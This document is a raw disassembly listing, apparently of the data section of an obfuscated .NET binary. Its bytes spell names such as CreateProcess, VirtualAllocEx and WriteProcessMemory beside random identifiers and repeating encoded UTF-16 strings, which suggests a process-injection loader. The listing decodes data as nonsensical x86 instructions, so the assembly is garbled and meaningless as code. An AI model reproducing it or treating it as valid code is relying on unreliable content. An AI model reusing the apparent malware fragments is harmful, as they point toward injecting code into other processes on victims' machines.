10003112:	00 4b 58             	add    %cl,0x58(%ebx)
10003115:	61                   	popa
10003116:	56                   	push   %esi
10003117:	76 4d                	jbe    0x10003166
10003119:	77 59                	ja     0x10003174
1000311b:	38 6f 44             	cmp    %ch,0x44(%edi)
1000311e:	7a 39                	jp     0x10003159
10003120:	76 45                	jbe    0x10003167
10003122:	70 6d                	jo     0x10003191
10003124:	77 6c                	ja     0x10003192
10003126:	55                   	push   %ebp
10003127:	30 77 69             	xor    %dh,0x69(%edi)
1000312a:	6f                   	outsl  %ds:(%esi),(%dx)
1000312b:	00 5a 65             	add    %bl,0x65(%edx)
1000312e:	72 6f                	jb     0x1000319f
10003130:	00 53 6c             	add    %dl,0x6c(%ebx)
10003133:	65 65 70 00          	gs gs jo 0x10003137
10003137:	45                   	inc    %ebp
10003138:	7a 72                	jp     0x100031ac
1000313a:	6d                   	insl   (%dx),%es:(%edi)
1000313b:	42                   	inc    %edx
1000313c:	59                   	pop    %ecx
1000313d:	57                   	push   %edi
1000313e:	55                   	push   %ebp
1000313f:	74 4d                	je     0x1000318e
10003141:	50                   	push   %eax
10003142:	39 32                	cmp    %esi,(%edx)
10003144:	68 70 00 53 79       	push   $0x79530070
10003149:	73 74                	jae    0x100031bf
1000314b:	65 6d                	gs insl (%dx),%es:(%edi)
1000314d:	2e 4c                	cs dec %esp
1000314f:	69 6e 71 00 56 6f 72 	imul   $0x726f5600,0x71(%esi),%ebp
10003156:	58                   	pop    %eax
10003157:	76 76                	jbe    0x100031cf
10003159:	39 63 4f             	cmp    %esp,0x4f(%ebx)
1000315c:	65 35 30 71 78 61    	gs xor $0x61787130,%eax
10003162:	65 47                	gs inc %edi
10003164:	6c                   	insb   (%dx),%es:(%edi)
10003165:	7a 35                	jp     0x1000319c
10003167:	70 4a                	jo     0x100031b3
10003169:	66 63 72 00          	arpl   %si,0x0(%edx)
1000316d:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
10003172:	00 49 6e             	add    %cl,0x6e(%ecx)
10003175:	74 50                	je     0x100031c7
10003177:	74 72                	je     0x100031eb
10003179:	00 53 79             	add    %dl,0x79(%ebx)
1000317c:	73 74                	jae    0x100031f2
1000317e:	65 6d                	gs insl (%dx),%es:(%edi)
10003180:	2e 44                	cs inc %esp
10003182:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
10003189:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
10003190:	74 65                	je     0x100031f7
10003192:	6d                   	insl   (%dx),%es:(%edi)
10003193:	2e 52                	cs push %edx
10003195:	75 6e                	jne    0x10003205
10003197:	74 69                	je     0x10003202
10003199:	6d                   	insl   (%dx),%es:(%edi)
1000319a:	65 2e 49             	gs cs dec %ecx
1000319d:	6e                   	outsb  %ds:(%esi),(%dx)
1000319e:	74 65                	je     0x10003205
100031a0:	72 6f                	jb     0x10003211
100031a2:	70 53                	jo     0x100031f7
100031a4:	65 72 76             	gs jb  0x1000321d
100031a7:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
100031ae:	73 74                	jae    0x10003224
100031b0:	65 6d                	gs insl (%dx),%es:(%edi)
100031b2:	2e 52                	cs push %edx
100031b4:	75 6e                	jne    0x10003224
100031b6:	74 69                	je     0x10003221
100031b8:	6d                   	insl   (%dx),%es:(%edi)
100031b9:	65 2e 43             	gs cs inc %ebx
100031bc:	6f                   	outsl  %ds:(%esi),(%dx)
100031bd:	6d                   	insl   (%dx),%es:(%edi)
100031be:	70 69                	jo     0x10003229
100031c0:	6c                   	insb   (%dx),%es:(%edi)
100031c1:	65 72 53             	gs jb  0x10003217
100031c4:	65 72 76             	gs jb  0x1000323d
100031c7:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
100031ce:	62 75 67             	bound  %esi,0x67(%ebp)
100031d1:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
100031d8:	65 
100031d9:	73 00                	jae    0x100031db
100031db:	47                   	inc    %edi
100031dc:	65 74 46             	gs je  0x10003225
100031df:	69 6c 65 73 00 43 6b 	imul   $0x4c6b4300,0x73(%ebp,%eiz,2),%ebp
100031e6:	4c 
100031e7:	69 51 4d 56 6f 6a 52 	imul   $0x526a6f56,0x4d(%ecx),%edx
100031ee:	49                   	dec    %ecx
100031ef:	30 77 33             	xor    %dh,0x33(%edi)
100031f2:	75 43                	jne    0x10003237
100031f4:	67 33 4e 64          	xor    0x64(%bp),%ecx
100031f8:	56                   	push   %esi
100031f9:	68 5a 67 73 00       	push   $0x73675a
100031fe:	43                   	inc    %ebx
100031ff:	6f                   	outsl  %ds:(%esi),(%dx)
10003200:	6e                   	outsb  %ds:(%esi),(%dx)
10003201:	74 61                	je     0x10003264
10003203:	69 6e 73 00 43 72 65 	imul   $0x65724300,0x73(%esi),%ebp
1000320a:	61                   	popa
1000320b:	74 65                	je     0x10003272
1000320d:	50                   	push   %eax
1000320e:	72 6f                	jb     0x1000327f
10003210:	63 65 73             	arpl   %esp,0x73(%ebp)
10003213:	73 00                	jae    0x10003215
10003215:	43                   	inc    %ebx
10003216:	6b 71 64 6e          	imul   $0x6e,0x64(%ecx),%esi
1000321a:	49                   	dec    %ecx
1000321b:	66 68 39 4a          	pushw  $0x4a39
1000321f:	78 75                	js     0x10003296
10003221:	69 6f 4e 62 77 6a 43 	imul   $0x436a7762,0x4e(%edi),%ebp
10003228:	77 43                	ja     0x1000326d
1000322a:	6e                   	outsb  %ds:(%esi),(%dx)
1000322b:	71 73                	jno    0x100032a0
1000322d:	73 00                	jae    0x1000322f
1000322f:	46                   	inc    %esi
10003230:	4f                   	dec    %edi
10003231:	4d                   	dec    %ebp
10003232:	41                   	inc    %ecx
10003233:	6b 6d 42 69          	imul   $0x69,0x42(%ebp),%ebp
10003237:	70 78                	jo     0x100032b1
10003239:	47                   	inc    %edi
1000323a:	47                   	inc    %edi
1000323b:	70 72                	jo     0x100032af
1000323d:	35 74 00 4f 62       	xor    $0x624f0074,%eax
10003242:	6a 65                	push   $0x65
10003244:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
10003248:	6f                   	outsl  %ds:(%esi),(%dx)
10003249:	6e                   	outsb  %ds:(%esi),(%dx)
1000324a:	76 65                	jbe    0x100032b1
1000324c:	72 74                	jb     0x100032c2
1000324e:	00 4e 65             	add    %cl,0x65(%esi)
10003251:	78 74                	js     0x100032c7
10003253:	00 53 79             	add    %dl,0x79(%ebx)
10003256:	73 74                	jae    0x100032cc
10003258:	65 6d                	gs insl (%dx),%es:(%edi)
1000325a:	2e 54                	cs push %esp
1000325c:	65 78 74             	gs js  0x100032d3
1000325f:	00 56 78             	add    %dl,0x78(%esi)
10003262:	6d                   	insl   (%dx),%es:(%edi)
10003263:	76 6d                	jbe    0x100032d2
10003265:	73 51                	jae    0x100032b8
10003267:	45                   	inc    %ebp
10003268:	67 63 7a 45          	arpl   %edi,0x45(%bp,%si)
1000326c:	50                   	push   %eax
1000326d:	50                   	push   %eax
1000326e:	44                   	inc    %esp
1000326f:	49                   	dec    %ecx
10003270:	64 58                	fs pop %eax
10003272:	53                   	push   %ebx
10003273:	54                   	push   %esp
10003274:	6e                   	outsb  %ds:(%esi),(%dx)
10003275:	77 62                	ja     0x100032d9
10003277:	6f                   	outsl  %ds:(%esi),(%dx)
10003278:	76 00                	jbe    0x1000327a
1000327a:	49                   	dec    %ecx
1000327b:	42                   	inc    %edx
1000327c:	63 6e 55             	arpl   %ebp,0x55(%esi)
1000327f:	4d                   	dec    %ebp
10003280:	42                   	inc    %edx
10003281:	59                   	pop    %ecx
10003282:	6f                   	outsl  %ds:(%esi),(%dx)
10003283:	33 44 64 4c          	xor    0x4c(%esp,%eiz,2),%eax
10003287:	47                   	inc    %edi
10003288:	6d                   	insl   (%dx),%es:(%edi)
10003289:	78 70                	js     0x100032fb
1000328b:	36 4d                	ss dec %ebp
1000328d:	6e                   	outsb  %ds:(%esi),(%dx)
1000328e:	55                   	push   %ebp
1000328f:	31 31                	xor    %esi,(%ecx)
10003291:	77 00                	ja     0x10003293
10003293:	4f                   	dec    %edi
10003294:	6a 44                	push   $0x44
10003296:	42                   	inc    %edx
10003297:	52                   	push   %edx
10003298:	70 65                	jo     0x100032ff
1000329a:	78 6a                	js     0x10003306
1000329c:	56                   	push   %esi
1000329d:	42                   	inc    %edx
1000329e:	48                   	dec    %eax
1000329f:	66 55                	push   %bp
100032a1:	73 64                	jae    0x10003307
100032a3:	55                   	push   %ebp
100032a4:	77 00                	ja     0x100032a6
100032a6:	56                   	push   %esi
100032a7:	69 72 74 75 61 6c 41 	imul   $0x416c6175,0x74(%edx),%esi
100032ae:	6c                   	insb   (%dx),%es:(%edi)
100032af:	6c                   	insb   (%dx),%es:(%edi)
100032b0:	6f                   	outsl  %ds:(%esi),(%dx)
100032b1:	63 45 78             	arpl   %eax,0x78(%ebp)
100032b4:	00 43 67             	add    %al,0x67(%ebx)
100032b7:	68 67 6e 51 55       	push   $0x55516e67
100032bc:	71 66                	jno    0x10003324
100032be:	5a                   	pop    %edx
100032bf:	46                   	inc    %esi
100032c0:	76 62                	jbe    0x10003324
100032c2:	62 68 78             	bound  %ebp,0x78(%eax)
100032c5:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
100032c9:	72 72                	jb     0x1000333d
100032cb:	61                   	popa
100032cc:	79 00                	jns    0x100032ce
100032ce:	57                   	push   %edi
100032cf:	72 69                	jb     0x1000333a
100032d1:	74 65                	je     0x10003338
100032d3:	50                   	push   %eax
100032d4:	72 6f                	jb     0x10003345
100032d6:	63 65 73             	arpl   %esp,0x73(%ebp)
100032d9:	73 4d                	jae    0x10003328
100032db:	65 6d                	gs insl (%dx),%es:(%edi)
100032dd:	6f                   	outsl  %ds:(%esi),(%dx)
100032de:	72 79                	jb     0x10003359
100032e0:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
100032e4:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
100032e9:	79 00                	jns    0x100032eb
100032eb:	6f                   	outsl  %ds:(%esi),(%dx)
100032ec:	70 5f                	jo     0x1000334d
100032ee:	45                   	inc    %ebp
100032ef:	71 75                	jno    0x10003366
100032f1:	61                   	popa
100032f2:	6c                   	insb   (%dx),%es:(%edi)
100032f3:	69 74 79 00 44 48 48 	imul   $0x68484844,0x0(%ecx,%edi,2),%esi
100032fa:	68 
100032fb:	71 4e                	jno    0x1000334b
100032fd:	46                   	inc    %esi
100032fe:	68 6c 65 77 6f       	push   $0x6f77656c
10003303:	70 4d                	jo     0x10003352
10003305:	36 46                	ss inc %esi
10003307:	43                   	inc    %ebx
10003308:	56                   	push   %esi
10003309:	46                   	inc    %esi
1000330a:	47                   	inc    %edi
1000330b:	6f                   	outsl  %ds:(%esi),(%dx)
1000330c:	63 73 7a             	arpl   %esi,0x7a(%ebx)
1000330f:	00 00                	add    %al,(%eax)
10003311:	84 d1                	test   %dl,%cl
10003313:	52                   	push   %edx
10003314:	00 32                	add    %dh,(%edx)
10003316:	00 39                	add    %bh,(%ecx)
10003318:	00 69 00             	add    %ch,0x0(%ecx)
1000331b:	61                   	popa
1000331c:	00 6b 00             	add    %ch,0x0(%ebx)
1000331f:	39 00                	cmp    %eax,(%eax)
10003321:	71 00                	jno    0x10003323
10003323:	52                   	push   %edx
10003324:	00 6b 00             	add    %ch,0x0(%ebx)
10003327:	39 00                	cmp    %eax,(%eax)
10003329:	71 00                	jno    0x1000332b
1000332b:	64 00 31             	add    %dh,%fs:(%ecx)
1000332e:	00 4a 00             	add    %cl,0x0(%edx)
10003331:	74 00                	je     0x10003333
10003333:	52                   	push   %edx
10003334:	00 6b 00             	add    %ch,0x0(%ebx)
10003337:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
1000333b:	59                   	pop    %ecx
1000333c:	00 6d 00             	add    %ch,0x0(%ebp)
1000333f:	70 00                	jo     0x10003341
10003341:	50                   	push   %eax
10003342:	00 61 00             	add    %ah,0x0(%ecx)
10003345:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10003348:	00 50 00             	add    %dl,0x0(%eax)
1000334b:	61                   	popa
1000334c:	00 6e 00             	add    %ch,0x0(%esi)
1000334f:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
10003353:	62 00                	bound  %eax,(%eax)
10003355:	32 00                	xor    (%eax),%al
10003357:	4a                   	dec    %edx
10003358:	00 71 00             	add    %dh,0x0(%ecx)
1000335b:	54                   	push   %esp
1000335c:	00 32                	add    %dh,(%edx)
1000335e:	00 70 00             	add    %dh,0x0(%eax)
10003361:	47                   	inc    %edi
10003362:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003366:	00 70 00             	add    %dh,0x0(%eax)
10003369:	33 00                	xor    (%eax),%eax
1000336b:	63 00                	arpl   %eax,(%eax)
1000336d:	47                   	inc    %edi
1000336e:	00 4a 00             	add    %cl,0x0(%edx)
10003371:	48                   	dec    %eax
10003372:	00 52 00             	add    %dl,0x0(%edx)
10003375:	32 00                	xor    (%eax),%al
10003377:	39 00                	cmp    %eax,(%eax)
10003379:	69 00 61 00 6b 00    	imul   $0x6b0061,(%eax),%eax
1000337f:	39 00                	cmp    %eax,(%eax)
10003381:	71 00                	jno    0x10003383
10003383:	52                   	push   %edx
10003384:	00 6b 00             	add    %ch,0x0(%ebx)
10003387:	39 00                	cmp    %eax,(%eax)
10003389:	71 00                	jno    0x1000338b
1000338b:	64 00 30             	add    %dh,%fs:(%eax)
1000338e:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
10003392:	00 59 00             	add    %bl,0x0(%ecx)
10003395:	6d                   	insl   (%dx),%es:(%edi)
10003396:	00 70 00             	add    %dh,0x0(%eax)
10003399:	50                   	push   %eax
1000339a:	00 61 00             	add    %ah,0x0(%ecx)
1000339d:	6b 00 5a             	imul   $0x5a,(%eax),%eax
100033a0:	00 50 00             	add    %dl,0x0(%eax)
100033a3:	61                   	popa
100033a4:	00 6e 00             	add    %ch,0x0(%esi)
100033a7:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
100033ab:	61                   	popa
100033ac:	00 30                	add    %dh,(%eax)
100033ae:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
100033b2:	00 62 00             	add    %ah,0x0(%edx)
100033b5:	32 00                	xor    (%eax),%al
100033b7:	4a                   	dec    %edx
100033b8:	00 71 00             	add    %dh,0x0(%ecx)
100033bb:	54                   	push   %esp
100033bc:	00 32                	add    %dh,(%edx)
100033be:	00 70 00             	add    %dh,0x0(%eax)
100033c1:	47                   	inc    %edi
100033c2:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
100033c6:	00 70 00             	add    %dh,0x0(%eax)
100033c9:	33 00                	xor    (%eax),%eax
100033cb:	52                   	push   %edx
100033cc:	00 32                	add    %dh,(%edx)
100033ce:	00 39                	add    %bh,(%ecx)
100033d0:	00 69 00             	add    %ch,0x0(%ecx)
100033d3:	61                   	popa
100033d4:	00 6b 00             	add    %ch,0x0(%ebx)
100033d7:	39 00                	cmp    %eax,(%eax)
100033d9:	71 00                	jno    0x100033db
100033db:	52                   	push   %edx
100033dc:	00 6b 00             	add    %ch,0x0(%ebx)
100033df:	39 00                	cmp    %eax,(%eax)
100033e1:	71 00                	jno    0x100033e3
100033e3:	64 00 30             	add    %dh,%fs:(%eax)
100033e6:	00 68 00             	add    %ch,0x0(%eax)
100033e9:	53                   	push   %ebx
100033ea:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
100033ee:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
100033f2:	00 59 00             	add    %bl,0x0(%ecx)
100033f5:	6d                   	insl   (%dx),%es:(%edi)
100033f6:	00 70 00             	add    %dh,0x0(%eax)
100033f9:	50                   	push   %eax
100033fa:	00 61 00             	add    %ah,0x0(%ecx)
100033fd:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10003400:	00 50 00             	add    %dl,0x0(%eax)
10003403:	61                   	popa
10003404:	00 6e 00             	add    %ch,0x0(%esi)
10003407:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
1000340b:	62 00                	bound  %eax,(%eax)
1000340d:	32 00                	xor    (%eax),%al
1000340f:	4a                   	dec    %edx
10003410:	00 71 00             	add    %dh,0x0(%ecx)
10003413:	54                   	push   %esp
10003414:	00 32                	add    %dh,(%edx)
10003416:	00 70 00             	add    %dh,0x0(%eax)
10003419:	47                   	inc    %edi
1000341a:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
1000341e:	00 70 00             	add    %dh,0x0(%eax)
10003421:	33 00                	xor    (%eax),%eax
10003423:	53                   	push   %ebx
10003424:	00 55 00             	add    %dl,0x0(%ebp)
10003427:	64 00 47 00          	add    %al,%fs:0x0(%edi)
1000342b:	52                   	push   %edx
1000342c:	00 32                	add    %dh,(%edx)
1000342e:	00 39                	add    %bh,(%ecx)
10003430:	00 69 00             	add    %ch,0x0(%ecx)
10003433:	61                   	popa
10003434:	00 6b 00             	add    %ch,0x0(%ebx)
10003437:	39 00                	cmp    %eax,(%eax)
10003439:	71 00                	jno    0x1000343b
1000343b:	52                   	push   %edx
1000343c:	00 6b 00             	add    %ch,0x0(%ebx)
1000343f:	39 00                	cmp    %eax,(%eax)
10003441:	71 00                	jno    0x10003443
10003443:	64 00 30             	add    %dh,%fs:(%eax)
10003446:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
1000344a:	00 59 00             	add    %bl,0x0(%ecx)
1000344d:	6d                   	insl   (%dx),%es:(%edi)
1000344e:	00 70 00             	add    %dh,0x0(%eax)
10003451:	50                   	push   %eax
10003452:	00 61 00             	add    %ah,0x0(%ecx)
10003455:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10003458:	00 50 00             	add    %dl,0x0(%eax)
1000345b:	61                   	popa
1000345c:	00 6e 00             	add    %ch,0x0(%esi)
1000345f:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
10003463:	59                   	pop    %ecx
10003464:	00 6b 00             	add    %ch,0x0(%ebx)
10003467:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
1000346b:	62 00                	bound  %eax,(%eax)
1000346d:	32 00                	xor    (%eax),%al
1000346f:	4a                   	dec    %edx
10003470:	00 71 00             	add    %dh,0x0(%ecx)
10003473:	54                   	push   %esp
10003474:	00 32                	add    %dh,(%edx)
10003476:	00 70 00             	add    %dh,0x0(%eax)
10003479:	47                   	inc    %edi
1000347a:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
1000347e:	00 70 00             	add    %dh,0x0(%eax)
10003481:	33 00                	xor    (%eax),%eax
10003483:	52                   	push   %edx
10003484:	00 32                	add    %dh,(%edx)
10003486:	00 39                	add    %bh,(%ecx)
10003488:	00 69 00             	add    %ch,0x0(%ecx)
1000348b:	61                   	popa
1000348c:	00 6b 00             	add    %ch,0x0(%ebx)
1000348f:	39 00                	cmp    %eax,(%eax)
10003491:	71 00                	jno    0x10003493
10003493:	52                   	push   %edx
10003494:	00 6b 00             	add    %ch,0x0(%ebx)
10003497:	39 00                	cmp    %eax,(%eax)
10003499:	71 00                	jno    0x1000349b
1000349b:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
1000349f:	6c                   	insb   (%dx),%es:(%edi)
100034a0:	00 71 00             	add    %dh,0x0(%ecx)
100034a3:	57                   	push   %edi
100034a4:	00 55 00             	add    %dl,0x0(%ebp)
100034a7:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
100034ab:	59                   	pop    %ecx
100034ac:	00 6d 00             	add    %ch,0x0(%ebp)
100034af:	70 00                	jo     0x100034b1
100034b1:	50                   	push   %eax
100034b2:	00 61 00             	add    %ah,0x0(%ecx)
100034b5:	6b 00 5a             	imul   $0x5a,(%eax),%eax
100034b8:	00 50 00             	add    %dl,0x0(%eax)
100034bb:	61                   	popa
100034bc:	00 6e 00             	add    %ch,0x0(%esi)
100034bf:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
100034c3:	62 00                	bound  %eax,(%eax)
100034c5:	32 00                	xor    (%eax),%al
100034c7:	4a                   	dec    %edx
100034c8:	00 71 00             	add    %dh,0x0(%ecx)
100034cb:	54                   	push   %esp
100034cc:	00 32                	add    %dh,(%edx)
100034ce:	00 70 00             	add    %dh,0x0(%eax)
100034d1:	47                   	inc    %edi
100034d2:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
100034d6:	00 70 00             	add    %dh,0x0(%eax)
100034d9:	33 00                	xor    (%eax),%eax
100034db:	57                   	push   %edi
100034dc:	00 46 00             	add    %al,0x0(%esi)
100034df:	4a                   	dec    %edx
100034e0:	00 73 00             	add    %dh,0x0(%ebx)
100034e3:	52                   	push   %edx
100034e4:	00 32                	add    %dh,(%edx)
100034e6:	00 39                	add    %bh,(%ecx)
100034e8:	00 69 00             	add    %ch,0x0(%ecx)
100034eb:	61                   	popa
100034ec:	00 6b 00             	add    %ch,0x0(%ebx)
100034ef:	39 00                	cmp    %eax,(%eax)
100034f1:	71 00                	jno    0x100034f3
100034f3:	52                   	push   %edx
100034f4:	00 6b 00             	add    %ch,0x0(%ebx)
100034f7:	39 00                	cmp    %eax,(%eax)
100034f9:	71 00                	jno    0x100034fb
100034fb:	64 00 30             	add    %dh,%fs:(%eax)
100034fe:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
10003502:	00 59 00             	add    %bl,0x0(%ecx)
10003505:	6d                   	insl   (%dx),%es:(%edi)
10003506:	00 70 00             	add    %dh,0x0(%eax)
10003509:	50                   	push   %eax
1000350a:	00 61 00             	add    %ah,0x0(%ecx)
1000350d:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10003510:	00 50 00             	add    %dl,0x0(%eax)
10003513:	61                   	popa
10003514:	00 6e 00             	add    %ch,0x0(%esi)
10003517:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
1000351b:	52                   	push   %edx
1000351c:	00 7a 00             	add    %bh,0x0(%edx)
1000351f:	46                   	inc    %esi
10003520:	00 48 00             	add    %cl,0x0(%eax)
10003523:	62 00                	bound  %eax,(%eax)
10003525:	32 00                	xor    (%eax),%al
10003527:	4a                   	dec    %edx
10003528:	00 71 00             	add    %dh,0x0(%ecx)
1000352b:	54                   	push   %esp
1000352c:	00 32                	add    %dh,(%edx)
1000352e:	00 70 00             	add    %dh,0x0(%eax)
10003531:	47                   	inc    %edi
10003532:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003536:	00 70 00             	add    %dh,0x0(%eax)
10003539:	33 00                	xor    (%eax),%eax
1000353b:	52                   	push   %edx
1000353c:	00 32                	add    %dh,(%edx)
1000353e:	00 39                	add    %bh,(%ecx)
10003540:	00 69 00             	add    %ch,0x0(%ecx)
10003543:	61                   	popa
10003544:	00 6b 00             	add    %ch,0x0(%ebx)
10003547:	39 00                	cmp    %eax,(%eax)
10003549:	71 00                	jno    0x1000354b
1000354b:	52                   	push   %edx
1000354c:	00 6b 00             	add    %ch,0x0(%ebx)
1000354f:	39 00                	cmp    %eax,(%eax)
10003551:	71 00                	jno    0x10003553
10003553:	64 00 32             	add    %dh,%fs:(%edx)
10003556:	00 78 00             	add    %bh,0x0(%eax)
10003559:	69 00 56 00 30 00    	imul   $0x300056,(%eax),%eax
1000355f:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
10003563:	59                   	pop    %ecx
10003564:	00 6d 00             	add    %ch,0x0(%ebp)
10003567:	70 00                	jo     0x10003569
10003569:	50                   	push   %eax
1000356a:	00 61 00             	add    %ah,0x0(%ecx)
1000356d:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10003570:	00 50 00             	add    %dl,0x0(%eax)
10003573:	61                   	popa
10003574:	00 6e 00             	add    %ch,0x0(%esi)
10003577:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
1000357b:	62 00                	bound  %eax,(%eax)
1000357d:	32 00                	xor    (%eax),%al
1000357f:	4a                   	dec    %edx
10003580:	00 71 00             	add    %dh,0x0(%ecx)
10003583:	54                   	push   %esp
10003584:	00 32                	add    %dh,(%edx)
10003586:	00 70 00             	add    %dh,0x0(%eax)
10003589:	47                   	inc    %edi
1000358a:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
1000358e:	00 70 00             	add    %dh,0x0(%eax)
10003591:	33 00                	xor    (%eax),%eax
10003593:	4f                   	dec    %edi
10003594:	00 58 00             	add    %bl,0x0(%eax)
10003597:	6c                   	insb   (%dx),%es:(%edi)
10003598:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
1000359c:	00 32                	add    %dh,(%edx)
1000359e:	00 39                	add    %bh,(%ecx)
100035a0:	00 69 00             	add    %ch,0x0(%ecx)
100035a3:	61                   	popa
100035a4:	00 6b 00             	add    %ch,0x0(%ebx)
100035a7:	39 00                	cmp    %eax,(%eax)
100035a9:	71 00                	jno    0x100035ab
100035ab:	52                   	push   %edx
100035ac:	00 6b 00             	add    %ch,0x0(%ebx)
100035af:	39 00                	cmp    %eax,(%eax)
100035b1:	71 00                	jno    0x100035b3
100035b3:	64 00 30             	add    %dh,%fs:(%eax)
100035b6:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
100035ba:	00 59 00             	add    %bl,0x0(%ecx)
100035bd:	6d                   	insl   (%dx),%es:(%edi)
100035be:	00 70 00             	add    %dh,0x0(%eax)
100035c1:	50                   	push   %eax
100035c2:	00 61 00             	add    %ah,0x0(%ecx)
100035c5:	6b 00 5a             	imul   $0x5a,(%eax),%eax
100035c8:	00 50 00             	add    %dl,0x0(%eax)
100035cb:	61                   	popa
100035cc:	00 6e 00             	add    %ch,0x0(%esi)
100035cf:	64 00 54 00 51       	add    %dl,%fs:0x51(%eax,%eax,1)
100035d4:	00 6e 00             	add    %ch,0x0(%esi)
100035d7:	42                   	inc    %edx
100035d8:	00 48 00             	add    %cl,0x0(%eax)
100035db:	62 00                	bound  %eax,(%eax)
100035dd:	32 00                	xor    (%eax),%al
100035df:	4a                   	dec    %edx
100035e0:	00 71 00             	add    %dh,0x0(%ecx)
100035e3:	54                   	push   %esp
100035e4:	00 32                	add    %dh,(%edx)
100035e6:	00 70 00             	add    %dh,0x0(%eax)
100035e9:	47                   	inc    %edi
100035ea:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
100035ee:	00 70 00             	add    %dh,0x0(%eax)
100035f1:	33 00                	xor    (%eax),%eax
100035f3:	52                   	push   %edx
100035f4:	00 32                	add    %dh,(%edx)
100035f6:	00 39                	add    %bh,(%ecx)
100035f8:	00 69 00             	add    %ch,0x0(%ecx)
100035fb:	61                   	popa
100035fc:	00 6b 00             	add    %ch,0x0(%ebx)
100035ff:	39 00                	cmp    %eax,(%eax)
10003601:	71 00                	jno    0x10003603
10003603:	52                   	push   %edx
10003604:	00 6b 00             	add    %ch,0x0(%ebx)
10003607:	39 00                	cmp    %eax,(%eax)
10003609:	71 00                	jno    0x1000360b
1000360b:	64 00 32             	add    %dh,%fs:(%edx)
1000360e:	00 4a 00             	add    %cl,0x0(%edx)
10003611:	70 00                	jo     0x10003613
10003613:	51                   	push   %ecx
10003614:	00 6b 00             	add    %ch,0x0(%ebx)
10003617:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
1000361b:	59                   	pop    %ecx
1000361c:	00 6d 00             	add    %ch,0x0(%ebp)
1000361f:	70 00                	jo     0x10003621
10003621:	50                   	push   %eax
10003622:	00 61 00             	add    %ah,0x0(%ecx)
10003625:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10003628:	00 50 00             	add    %dl,0x0(%eax)
1000362b:	61                   	popa
1000362c:	00 6e 00             	add    %ch,0x0(%esi)
1000362f:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
10003633:	62 00                	bound  %eax,(%eax)
10003635:	32 00                	xor    (%eax),%al
10003637:	4a                   	dec    %edx
10003638:	00 71 00             	add    %dh,0x0(%ecx)
1000363b:	54                   	push   %esp
1000363c:	00 32                	add    %dh,(%edx)
1000363e:	00 70 00             	add    %dh,0x0(%eax)
10003641:	47                   	inc    %edi
10003642:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003646:	00 70 00             	add    %dh,0x0(%eax)
10003649:	33 00                	xor    (%eax),%eax
1000364b:	4d                   	dec    %ebp
1000364c:	00 46 00             	add    %al,0x0(%esi)
1000364f:	6c                   	insb   (%dx),%es:(%edi)
10003650:	00 59 00             	add    %bl,0x0(%ecx)
10003653:	52                   	push   %edx
10003654:	00 32                	add    %dh,(%edx)
10003656:	00 39                	add    %bh,(%ecx)
10003658:	00 69 00             	add    %ch,0x0(%ecx)
1000365b:	61                   	popa
1000365c:	00 6b 00             	add    %ch,0x0(%ebx)
1000365f:	39 00                	cmp    %eax,(%eax)
10003661:	71 00                	jno    0x10003663
10003663:	52                   	push   %edx
10003664:	00 6b 00             	add    %ch,0x0(%ebx)
10003667:	39 00                	cmp    %eax,(%eax)
10003669:	71 00                	jno    0x1000366b
1000366b:	64 00 30             	add    %dh,%fs:(%eax)
1000366e:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
10003672:	00 59 00             	add    %bl,0x0(%ecx)
10003675:	6d                   	insl   (%dx),%es:(%edi)
10003676:	00 70 00             	add    %dh,0x0(%eax)
10003679:	50                   	push   %eax
1000367a:	00 61 00             	add    %ah,0x0(%ecx)
1000367d:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10003680:	00 50 00             	add    %dl,0x0(%eax)
10003683:	61                   	popa
10003684:	00 6e 00             	add    %ch,0x0(%esi)
10003687:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
1000368b:	62 00                	bound  %eax,(%eax)
